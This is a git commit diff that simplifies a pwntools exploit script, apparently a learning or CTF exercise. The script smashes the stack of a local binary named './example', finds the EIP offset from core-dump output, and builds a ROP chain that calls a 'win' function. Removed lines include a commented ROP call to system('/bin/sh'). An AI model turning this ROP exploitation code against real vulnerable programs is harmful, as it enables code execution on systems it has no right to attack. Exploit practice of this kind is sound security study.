43ab5d31c27cade4231a8b25d1023864f235eb29
Zack Sargent <zack@zack.fyi>
2024-11-13 16:58:39 -0500

    simplify

--- attack.py
+++ attack.py
@@ -1,137 +1,70 @@
 #!/usr/bin/env python3
+"""
+NOW
+...
+trying i=99
+[+] Starting local process './example': pid 116
+[*] Process './example' stopped with exit code -11 (SIGSEGV) (pid 116)
+[+] Parsing corefile...: Done
+[*] '/tmp/core.example.116'
+    Arch:      i386-32-little
+    EIP:       0x61616174
+    ESP:       0xffffdc50
+    Exe:       '/app/example' (0x56555000)
+    Fault:     0x61616174
++----------+------------+---------------+-------------+
+| register | hex value  | decimal value | cyclic_find |
++----------+------------+---------------+-------------+
+| orig_eax | 0xffffffff | 4294967295    | -1          |
+| ecx      | 0xffffdec0 | 4294958784    | -1          |
+| esi      | 0xffffdc90 | 4294958224    | -1          |
+| edx      | 0xffffdc5f | 4294958175    | -1          |
+| esp      | 0xffffdc50 | 4294958160    | -1          |
+| eax      | 0xffffdc00 | 4294958080    | -1          |
+| edi      | 0xf7ffcb80 | 4160736128    | -1          |
+| eip      | 0x61616174 | 1633771892    | 76          |
+| ebp      | 0x61616173 | 1633771891    | 72          |
+| ebx      | 0x61616172 | 1633771890    | 68          |
+| eflags   | 0x10286    | 66182         | -1          |
+| xgs      | 0x63       | 99            | -1          |
+| xds      | 0x2b       | 43            | -1          |
+| xes      | 0x2b       | 43            | -1          |
+| xss      | 0x2b       | 43            | -1          |
+| xcs      | 0x23       | 35            | -1          |
+| xfs      | 0x0        | 0             | -1          |
++----------+------------+---------------+-------------+
+"""
 
+import sys
 from pwn import *
 from itertools import cycle
-import os
 
-def get_corefile_location(executable_name: str, pid: int) -> os.PathLike[str]:
-    with open("/proc/sys/kernel/core_pattern") as f:
-        core_pattern = f.read()
-        assert "%e" and "%p" in core_pattern
-        return core_pattern.replace("%e", executable_name).replace("%p", str(pid)).strip()
+elf = ELF("./example")
 
-# Generate a pattern of 100 bytes, larger than the buffer size
+with elf.process() as p:
+    # To compensate for PIE, we must know the offset at runtime.
+    base_address = p.libs()['/app/example']
+    # Then, we ensure our functions are offset by that amount.
+    elf.address = base_address
 
-# 64 -> instruction pointer = \0
-# 65 -> instruction pointer = \0
-# 66 -> instruction pointer = noise
-# 67 -> instruction pointer = 41413d
-
-i = 128
-pattern = cyclic(i)
-
-# Start the vulnerable binary
-with process('./example') as p:
-    # Send the pattern as input
-    print("current pid", p.pid)
-    p.sendline(pattern)
-    p.wait()  # Wait for the program to crash
-
-# Examine the crash to find the offset
-def print_details(name: str, pid: int) -> str:
-    core = Coredump(get_corefile_location(name, pid))
-    for k,v in core.registers.items():
-        new_offset = cyclic_find(v)
-        # print(f"{k=},{v=},{new_offset}")
-        if new_offset != -1:
-            print(f"overwrote register {k} with value {v} at offset {new_offset}")
-
-
-print_details("example", p.pid)
-# Our ROP chain will use gadgets from the following ELFs
-binary = ELF('./example')
-rop = ROP([binary,
-           ELF('/usr/lib/gcc/x86_64-linux-gnu/12/libcc1.so')])
-
-# Write a ROP chain that calls some libc functions!
-#  rop.call('system', ['/bin/sh'])
-#  rop.call('exit', [0])
+# Now, we can create our attack.
+## --------------
+rop = ROP(elf)
 rop.win()
 
-print('ropchain:')
+
+offset = 76 # This needs to be the offset for eip
+## --------------
+
+payload = flat({
+    offset: rop.chain()
+})
+
+print("ropchain:")
 print(rop.dump())
+print("payload:")
+print(rop.chain())
 
-ropchain = rop.chain()
-offset = 92
-payload = flat({offset: ropchain}, filler=cycle(b'A'))[:-2]
-print(f"{payload=}")
-
-print("attacking...")
-with process(binary.path) as example:
-    print(example.recvline(timeout=5))
-    example.sendline(payload)
-    # print(example.recvline(timeout=5))
-    print_details("example", example.pid)
-
-"""
-# # Override pwntools's default cache directory to your secret tmp directory
-# # (workaround for <https://github.com/Gallopsled/pwntools/issues/2072>)
-# os.environ['XDG_CACHE_HOME'] = './'
-
-# Our ROP chain will use gadgets from the following ELFs
-binary = ELF('./example')
-rop = ROP([binary,
-           ELF('/usr/lib/gcc/x86_64-linux-gnu/12/libcc1.so')])
-
-# Write a ROP chain that calls some libc functions!
-#  rop.call('system', ['/bin/sh'])
-#  rop.call('exit', [0])
-rop.win_function()
-
-# Pretty-print the finished payload
-print(rop.dump())
-
-# Convert it to bytes
-ropchain = rop.chain()
-print(f"{ropchain=}")
-
-offset = 30
-payload = flat({offset: ropchain}, filler=cycle(b'A'))
-print(f"{payload=}")
-
-print("attacking...")
-with process(binary.path) as example:
-    print(example.recvline(timeout=5))
-    example.sendline(payload)
-    print(example.recvline(timeout=5))
-"""
-
-
-#  from itertools import cycle
-#  from pwn import *
-
-#  binary = ELF('./example')
-
-#  # print(binary.sym)
-
-#  rop = ROP(binary)
-#  rop.foo()
-#  rop.exit()
-
-#  print(rop.dump())
-#  print("Binary Data:")
-#  print(hexdump(bytes(rop)))
-#  ropchain = rop.chain()
-
-#  offset = 30
-#  payload = flat({offset: ropchain}, filler=cycle(b'A'))
-
-#  print(f"{payload=}")
-
-#  #  buffer_size = 10
-#  #  padding = str(0xaa) * buffer_size
-
-#  #  payload = padding.encode() + ropchain
-
-#  print('exploiting...')
-
-#  with process(binary.path) as example:
-#  example.sendline(payload)
-#  print(example.recvline(timeout=5))
-
-
-#  #  #  print(binary.symbols['foo'])
-#  #  #  print(binary.symbols)
-
-
+with elf.process([payload]) as p:
+    p.interactive()
 
